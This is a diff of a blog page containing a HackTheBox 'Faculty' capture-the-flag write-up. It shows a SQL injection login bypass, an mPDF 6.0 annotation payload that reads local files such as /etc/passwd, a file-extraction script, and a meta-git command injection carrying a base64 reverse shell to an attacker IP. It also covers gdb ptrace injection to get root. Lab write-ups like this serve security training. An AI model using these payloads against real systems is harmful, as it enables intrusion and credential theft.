@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="MØstXeon">
 <meta name="description" content="false" />
-<meta name="keywords" content=", SQL-Injection, MPDF, LFI, meta-git, Linux-Capabilities" />
+<meta name="keywords" content=", HackTheBox, Linux, SQL-Injection, ExifTool, MPDF, Burp-Suite, LFI, Python3-Script, Clear-Text-Credentials, Password-Reuse, meta-git, GDB, Linux-Capabilities, cap_sys_ptrace" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="https://mostxeon.github.io/posts/faculty/" />
@@ -14,7 +14,7 @@
 
     <title>
         
-            Faculty :: MØst Xeon  — A simple blog about Cyber Security
+            Faculty Write-Up :: MØst Xeon  — Simple Cyber Security Blog
         
     </title>
 
@@ -38,13 +38,13 @@
     <meta name="msapplication-TileColor" content="">
 
 
-<meta itemprop="name" content="Faculty">
+<meta itemprop="name" content="Faculty Write-Up">
 <meta itemprop="description" content="false"><meta itemprop="datePublished" content="2022-10-18T20:50:11+03:00" />
 <meta itemprop="dateModified" content="2022-10-18T20:50:11+03:00" />
-<meta itemprop="wordCount" content="1590">
-<meta itemprop="keywords" content="SQL-Injection,MPDF,LFI,meta-git,Linux-Capabilities," />
+<meta itemprop="wordCount" content="1599">
+<meta itemprop="keywords" content="HackTheBox,Linux,SQL-Injection,ExifTool,MPDF,Burp-Suite,LFI,Python3-Script,Clear-Text-Credentials,Password-Reuse,meta-git,GDB,Linux-Capabilities,cap_sys_ptrace," />
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Faculty"/>
+<meta name="twitter:title" content="Faculty Write-Up"/>
 <meta name="twitter:description" content="false"/>
 
 
@@ -62,6 +62,18 @@
 
 
 
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PQV7ZN74BD"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-PQV7ZN74BD', { 'anonymize_ip': false });
+}
+</script>
 
 
     </head>
@@ -138,14 +150,14 @@
 
     <article>
       <h1 class="post-title">
-        <a href="https://mostxeon.github.io/posts/faculty/">Faculty</a>
+        <a href="https://mostxeon.github.io/posts/faculty/">Faculty Write-Up</a>
       </h1>
 
       
 
       
         <figure class="post-cover">
-          <img src="https://www.hackthebox.com/storage/avatars/8e579b42d4f769a16ca5dde6feae8df4.png" alt="Faculty" />
+          <img src="https://www.hackthebox.com/storage/avatars/8e579b42d4f769a16ca5dde6feae8df4.png" alt="Faculty Write-Up" />
           
           
             <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/36994">gbyolo</a></figcaption>
@@ -260,8 +272,9 @@
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1580.64 seconds
 </span></span></code></pre></div><p>I can see from the above results 2 open ports <em>80 and 22</em>.</p>
 <h2 id="inspecting-web-page">Inspecting Web Page</h2>
-<p>Inspecting the webpage on <em>port 80</em>, it redirects me to <em>faculty.htb</em> so I&rsquo;ll add that to my <em>/etc/hosts</em> file.</p>
-<p>A login page was the first page that appeared to us.</p>
+<p>Inspecting the webpage on <em>port 80</em>, it redirects me to <em>faculty.htb</em> so I&rsquo;ll add that to my <em>/etc/hosts</em> file:</p>
+<p><code>sudo echo -e '10.10.11.169\tfaculty.htb' | sudo tee -a /etc/hosts</code></p>
+<p>A login page was the first page that appeared to me.</p>
 <p><img src="login_page.png" alt="Login Page"></p>
 <h3 id="bypassing-login-using-sqli">Bypassing Login Using SQLI</h3>
 <p>The first thing I tried was a simple sql injection: <em>&lsquo;or &lsquo;1&rsquo;=&lsquo;1</em> and it worked.</p>
@@ -272,13 +285,13 @@
 <p><img src="locating_admin_directory.png" alt="Source Code Inspection"></p>
 <p><img src="admin_panel.png" alt="Admin Panel"></p>
 <h3 id="exporting-pdfs">Exporting PDFs</h3>
-<p>After navigating through the pages I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
+<p>After navigating through the pages, I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
 <p><img src="viewing_export_pdf_button.png" alt="Export PDF"></p>
-<p>By looking at the <em>URL</em>, it seems that they are using mpdf to generate these pdfs.</p>
+<p>By looking at the <em>URL</em>, it seems that they are using <a href="https://mpdf.github.io/"><em>mPDF</em></a> to generate these pdfs.</p>
 <p><img src="seeing_mpdf_in_the_url.png" alt="Noticing MPDF In URL"></p>
-<p>To get more information about which version is used I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
+<p>To get more information about which version is used, I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
 <p><img src="download_button_for_pdf.png" alt="Download PDF"></p>
-<p>Using exiftool:</p>
+<p>Using <a href="https://exiftool.org/"><em>exiftool</em></a>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.44
@@ -304,19 +317,19 @@
 <p>First I need to understand how data is processed to generate these pdf files, so I&rsquo;ll intercept the <em>export pdf</em> request using <em>Burp Suite</em>.</p>
 <p><img src="clicking_pdf_download.png" alt="Export PDF"></p>
 <p><img src="intercepting_request.png" alt="Intercepting Request"></p>
-<p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
-<p>This opens for me a new attack surface, because now I can try to inject our payloads after encoding it and let <em>mpdf 6.0</em> process it.</p>
+<p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request, having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
+<p>This opens for me a new attack surface, because now I can try to inject my payloads after encoding it and let <em>mPDF 6.0</em> process it.</p>
 <h3 id="locating-mpdf-lfi-exploit">Locating MPDF LFI Exploit</h3>
 <p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on <a href="https://github.com/mpdf/mpdf/issues/356"><em>github</em></a>. I also found this <a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
 <h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
-<p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and mpdf 6.0 was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
+<p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and <em>mPDF 6.0</em> was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
 <p>This is the payload I&rsquo;ll use:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">annotation</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>  <span style="color:#a6e22e">icon</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Graph&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attached File: /etc/passwd&#34;</span> <span style="color:#a6e22e">pos-x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;195&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>Base64 encoded: PGFubm90YXRpb24lMmJmaWxlJTI1M2QiL2V0Yy9wYXNzd2QiJTJiY29udGVudCUyNTNkIi9ldGMvcGFzc3dkIiUyYiUyYmljb24lMjUzZCJHcmFwaCIlMmJ0aXRsZSUyNTNkIkF0dGFjaGVkJTJiRmlsZSUyNTNhJTJiL2V0Yy9wYXNzd2QiJTJicG9zLXglMjUzZCIxOTUiJTJiLz4=
 </span></span></code></pre></div><p><img src="sending_etcpasswd_payload.png" alt="Sending /etc/passwd Payload"></p>
 <p>Got the pdf name, and since I already saw the path to get the pdf I can navigate to it.</p>
 <p><img src="downloading_etcpasswd_pdf.png" alt="Downloading /etc/passwd pdf"></p>
-<p>The pdf looks empty and this because I opened it using firefox, so the annotation mark will not appear, that&rsquo;s why I need to download it and open it with a proper pdf viewer. (I&rsquo;ll use kali&rsquo;s default pdf viewer <em>Atril Document Viewer</em>)</p>
+<p>The pdf looks empty and this is because I opened it using firefox, so the annotation mark will not appear, that&rsquo;s why I need to download it and open it with a proper pdf viewer. (I&rsquo;ll use kali&rsquo;s default pdf viewer <em>Atril Document Viewer</em>)</p>
 <p><img src="Seeing_etcpasswd_attachment.png" alt="Viewing /etc/passwd Annotation Mark"></p>
 <p>Upon clicking the annotation, a new window will popup showing the contents of the file.</p>
 <p><img src="reading_etcpasswd_from_annotation.png" alt="Reading /etc/passwd from Annotation"></p>
@@ -357,23 +370,23 @@
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Reading </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(fileToRead), pdf<span style="color:#f92672">.</span>getPage(<span style="color:#ae81ff">0</span>)[<span style="color:#e6db74">&#39;/Annots&#39;</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>getObject()[<span style="color:#e6db74">&#39;/FS&#39;</span>][<span style="color:#e6db74">&#39;/EF&#39;</span>][<span style="color:#e6db74">&#39;/F&#39;</span>]<span style="color:#f92672">.</span>getData()<span style="color:#f92672">.</span>decode())
 </span></span></code></pre></div><p><img src="reading_etcpasswd_using_script.png" alt="Reading Files Using Script"></p>
 <h3 id="reading-database-credentials">Reading Database Credentials</h3>
-<p>The first thing I&rsquo;ll do is to look for the main application code like index.php to see if I can find the <em>database configuration</em> file to get some <em>credentials</em>.</p>
+<p>The first thing I&rsquo;ll do is to look for the main application code like <em>index.php</em> to see if I can find the <em>database configuration</em> file to get some <em>credentials</em>.</p>
 <p><img src="reading_index.php_.png" alt="Reading index.php"></p>
 <p><img src="reading_login.php_.png" alt="Reading login.php"></p>
 <p><img src="reading_db_connect.php_.png" alt="Reading db_connect.php"></p>
 <p>I know from the <em>/etc/passwd</em> file read before that there are 2 users on the box <em>gbyolo</em> and <em>developer</em> (They have their own <em>home directory</em> and <em>/bin/bash</em> as login shell).</p>
 <p><img src="enumerating_users_from_etcpasswd.png" alt="Enumerate Users From /etc/passwd"></p>
-<p>I can try to SSH to these users using the password got from reading <em>db_connect.php</em> because people usually reuse passwords everywhere.</p>
+<p>I can try to SSH using these users providing the password got from reading <em>db_connect.php</em> because people usually reuse passwords everywhere.</p>
 <p><img src="ssh_as_gbyolo.png" alt="SSH As gbyolo"></p>
 <p>And it worked using <em>gbyolo</em> as username.</p>
 <h2 id="escalating-from-user-gbyolo-to-developer">Escalating From User gbyolo To developer</h2>
-<p>If I run <em>sudo -l</em> I get the following result:</p>
+<p>If I run <code>sudo -l</code> I get the following result:</p>
 <p><img src="sudo_dash_l.png" alt="sudo -l As gbyolo"></p>
 <p>User gbyolo can run <em>meta-git</em> as developer, howerver this executable is inside <em>/usr/local/bin</em> which means that it was installed manually (wasn&rsquo;t installed using a package manager like <em>apt</em> for example) and there is a big chance that it is out of date and could have some vulnerabilities.</p>
-<p>Searching a little bit on google about meta-git and some possible exploits, I found this <a href="https://hackerone.com/reports/728040"><em>bug report</em></a> on <a href="https://hackerone.com"><em>HackerOne</em></a> which affects every version of meta-git according to <a href="https://security.snyk.io/package/npm/meta-git"><em>snyk</em></a>.</p>
+<p>Searching a little bit on google about meta-git and some possible exploits, I found this <a href="https://hackerone.com/reports/728040"><em>bug report</em></a> on <a href="https://hackerone.com"><em>HackerOne</em></a> which affects every version of <em>meta-git</em> according to <a href="https://security.snyk.io/package/npm/meta-git"><em>snyk</em></a>.</p>
 <p>I can get a reverse shell now as user developer.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -u developer /usr/local/bin/meta-git clone <span style="color:#e6db74">&#39;sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash&#39;</span>
-</span></span></code></pre></div><p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
+<p><code>sudo -u developer /usr/local/bin/meta-git clone 'sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash'</code></p>
+<p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
 <p><img src="gettting_reverse_shell_as_developer.png" alt="Getting Reverse Shell As developer"></p>
 <p>I will get a fully interactive shell using python:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
@@ -397,14 +410,14 @@
 </span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
 </span></span></code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>I can abuse this to attach to root running processes and call a reverse shell back to me.</p>
-<p>This can be done with any process by injecting a compiled reverse shell into its memory, howerver if the process is running python3 it becomes easier, because I can call the build in python3 system function and pass a reverse shell to it directly.</p>
+<p>This can be done with any process by injecting a compiled reverse shell into its memory, howerver if the process is running python3 it becomes easier, because I can call the <em>built-in python3 system function</em> and pass a reverse shell to it directly.</p>
 <p>Among the running processes I will choose this python3 process:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.0$ ps aux | grep root
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">731</span>  0.0  0.9  <span style="color:#ae81ff">26896</span> <span style="color:#ae81ff">18204</span> ?        Ss   13:15   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
 </span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><p>Then I will debug it using gdb and inject my malicious code:</p>
+</span></span></code></pre></div><p>Then I will debug it using <em>gdb</em> and inject my malicious code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gdb -p <span style="color:#ae81ff">731</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>...
@@ -422,11 +435,20 @@
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
+        <span class="tag"><a href="https://mostxeon.github.io/tags/hackthebox/">HackTheBox</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/linux/">Linux</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/sql-injection/">SQL-Injection</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/exiftool/">ExifTool</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/mpdf/">MPDF</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/burp-suite/">Burp-Suite</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/lfi/">LFI</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/python3-script/">Python3-Script</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/clear-text-credentials/">Clear-Text-Credentials</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/password-reuse/">Password-Reuse</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/meta-git/">meta-git</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/gdb/">GDB</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/linux-capabilities/">Linux-Capabilities</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/cap_sys_ptrace/">cap_sys_ptrace</a></span>
         
     </p>
 
@@ -451,7 +473,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1590 Words
+        1599 Words
       </p>
 
       <p>
@@ -490,7 +512,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Faculty&amp;caption=Faculty&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Faculty%20Write-Up&amp;caption=Faculty%20Write-Up&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -499,7 +521,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Faculty&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Faculty%20Write-Up&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -507,7 +529,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f;description=Faculty" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f;description=Faculty%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -515,7 +537,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;title=Faculty&amp;summary=Faculty&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;title=Faculty%20Write-Up&amp;summary=Faculty%20Write-Up&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -523,7 +545,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;resubmit=true&amp;title=Faculty" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;resubmit=true&amp;title=Faculty%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -531,7 +553,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f;title=Faculty" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f;title=Faculty%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -539,7 +561,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Faculty%20https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Faculty%20Write-Up%20https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -547,7 +569,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;t=Faculty" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
